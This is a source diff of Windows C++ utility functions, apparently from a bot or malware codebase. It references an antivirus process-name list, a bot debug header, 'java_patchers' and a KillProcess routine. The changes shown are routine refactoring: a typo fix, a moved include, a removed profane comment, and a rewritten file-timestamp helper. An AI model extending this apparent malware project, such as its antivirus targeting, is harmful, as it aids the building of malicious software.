@@ -26,6 +26,16 @@ namespace UTILSDEBUGSTRINGS
 
 
 
+//#include "BotDebug.h"
+
+
+namespace java_patchers
+{
+    #include "DbgTemplates.h"
+}
+#define OutMessages  java_patchers::DBGOutMessage<>
+
+
 
 //--------------------------------------------------
 //  Список имён процессов анти вирусов
@@ -1830,7 +1840,7 @@ DWORD File::WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize)
 }
 //----------------------------------------------------------------------------
 
-LPBYTE FileRealReadToBuffe(HANDLE File, DWORD &BufferSize)
+LPBYTE FileRealReadToBuffer(HANDLE File, DWORD &BufferSize)
 {
 	BufferSize = 0;
 	if (File == INVALID_HANDLE_VALUE)
@@ -1866,7 +1876,7 @@ LPBYTE File::ReadToBufferA(PCHAR FileName, DWORD &BufferSize)
 	HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
 								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
-	return FileRealReadToBuffe(File, BufferSize);
+	return FileRealReadToBuffer(File, BufferSize);
 }
 //----------------------------------------------------------------------------
 
@@ -1879,7 +1889,7 @@ LPBYTE File::ReadToBufferW(PWCHAR FileName, DWORD &BufferSize)
 	HANDLE File = pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
 								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
-	return FileRealReadToBuffe(File, BufferSize);
+	return FileRealReadToBuffer(File, BufferSize);
 }
 //----------------------------------------------------------------------------
 
@@ -2185,6 +2195,7 @@ bool DeleteFolders(PCHAR From)
 
 }
 //-----------------------------------------------------------------------------
+
 void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
 {
 	// Функция перебирает все подключенные в системе диски
@@ -2234,7 +2245,7 @@ bool IsExecutableFile(LPVOID Buf)
 }
 //----------------------------------------------------------------------------
 
-// Эту срань убрать
+// Это убрать
 LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
 {
 
@@ -2269,12 +2280,6 @@ LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
 
 	return pbF;
 }
-
-// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
-// Нахуй руки оторву за такую писанину!!!!!!!!!!!!!!!! GSV
-
-// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
 // ----------------------------------------------------------------------------------------
 bool isFileExists(int FlagFolderDest, WCHAR*Path)
@@ -2347,15 +2352,6 @@ bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
 	
 	return true;
 }
-
-//#include "BotDebug.h"
-
-
-namespace java_patchers
-{
-    #include "DbgTemplates.h"
-}
-#define OutMessages  java_patchers::DBGOutMessage<>
 
 
 BOOL KillProcess(DWORD pid,DWORD TimeOut )
@@ -2836,15 +2832,48 @@ HANDLE TryCreateSingleInstance(const char* MutexPrefix)
 //                 миллисекундах с момента последнего
 //				   изменения файла
 //------------------------------------------------------
-DWORD File::LastWriteTime(HANDLE File)
-{
 
+DWORD File::LastWriteTime(HANDLE FileHandle)
+{
 	// Функция проверяет время последнего изменения файла
 
 	// Получаем время файла
 	FILETIME Create, Write, Access, Now;
 
-	if (!pGetFileTime(File, &Create, &Access, &Write))
+	if (!pGetFileTime(FileHandle, &Create, &Access, &Write))
+		return 0;
+
+	// Получаем системное время
+	pGetSystemTimeAsFileTime(&Now);
+
+	// Сравниваем время
+	ULARGE_INTEGER  T1, T2;
+
+	T1.LowPart  = Now.dwLowDateTime;
+	T1.HighPart = Now.dwHighDateTime;
+
+	T2.LowPart  = Write.dwLowDateTime;
+	T2.HighPart = Write.dwHighDateTime;
+
+
+	// Еденица измерения файлового времени 100 наносекунд
+	// по этому, для получения времени в милисекундах,
+	// делим разницу на константу
+	DWORD Delta = (T1.QuadPart - T2.QuadPart) / 10000;
+
+	return Delta;
+}
+
+/*
+
+DWORD File::LastWriteTime(HANDLE FileHandle)
+{
+	// Функция проверяет время последнего изменения файла
+
+	// Получаем время файла
+	FILETIME Create, Write, Access, Now;
+
+	if (!pGetFileTime(FileHandle, &Create, &Access, &Write))
 		return 0;
 
 	// Получаем системное время
@@ -2866,3 +2895,4 @@ DWORD File::LastWriteTime(HANDLE File)
 	// делим разницу на константу
 	return Delta / 10000;
 }
+*/
